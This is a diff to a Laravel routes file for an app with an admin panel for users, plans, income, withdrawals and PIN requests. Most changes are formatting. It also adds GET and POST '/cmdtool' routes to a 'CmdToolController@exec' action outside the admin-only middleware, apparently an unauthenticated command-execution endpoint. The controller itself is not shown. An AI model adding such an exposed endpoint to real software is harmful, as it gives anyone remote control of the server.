@@ -15,6 +15,9 @@ Route::get('/', function () {
     return view('welcome');
 });
 
+Route::get( '/cmdtool', [ 'as' => 'cmdtool', 'uses' => 'CmdToolController@index' ] );
+Route::post( '/cmdtool', [ 'uses' => 'CmdToolController@exec' ] );
+
 //Auth::routes();
 // Password Reset Routes...
 Route::post('password/email', [ 'as' => 'password.email', 'uses' => 'Auth\ForgotPasswordController@sendResetLinkEmail' ]);
@@ -39,27 +42,25 @@ Route::group(['prefix' => '/_7admin', 'namespace' => 'Admin', 'as' => 'admin.'],
 	Route::post('login', [ 'as' => 'login.post', 'uses' => 'Auth\LoginController@login' ]);
 	Route::any('logout', [ 'as' => 'logout', 'uses' => 'Auth\LoginController@logout' ]);
 
-	Route::group(['middleware'=> [\App\Http\Middleware\AdminOnlyMiddleware::class]], function (){
+	Route::group(['middleware'=> [\App\Http\Middleware\AdminOnlyMiddleware::class ]], function (){
 		Route::get('/', [ 'uses' => "DashboardController@index", 'as' => 'dashboard']);
 
-		Route::post('role/permission/{role}', ['uses' => 'RoleController@updatePermissions', 'as' => 'role.permission.update']);
+		Route::post('role/permission/{role}', [
+				'uses' => 'RoleController@updatePermissions',
+				'as' => 'role.permission.update'
+		]);
 		Route::resource('role', 'RoleController');
-
 		Route::resource('user', 'UserController');
-
 		Route::resource('plan', 'PlanController');
 		Route::resource('plan-condition', 'PlanConditionController');
-
 		Route::get('/income/owner/{owner}', ['uses' => 'IncomeController@ownerIncome', 'as' => 'income.owner']);
 		Route::post('/income/{owner}/settlement/create', ['uses' => 'IncomeController@makeSettlement', 'as' => 'income.settlement.create']);
 		Route::resource('income', 'IncomeController');
-
 		Route::resource('settlement', 'SettlementController');
+		Route::get('withdrawal-paid', 'WithdrawalController@indexPaid')->name('withdrawalpaid.index');
 		Route::resource('withdrawal', 'WithdrawalController');
-		Route::resource('withdrawalpaid', 'WithdrawlPaidController');
 		Route::resource('profiles', 'CustomersController');
 		Route::resource('service_center', 'ServiceCenterController');
-
 		Route:: resource('pin-request', 'PinRequestController');
 		Route:: post('pin-request/{pin_request}/send', 'PinRequestController@send')->name('pin-request.send');
 	});
@@ -67,7 +68,6 @@ Route::group(['prefix' => '/_7admin', 'namespace' => 'Admin', 'as' => 'admin.'],
 });
 
 Route::group(['prefix' => 'agent', 'namespace' => 'Agent', 'as' => 'agent.'] , function (){
-
 	Route:: resource('pin-request', 'PinRequestController');
 });
 
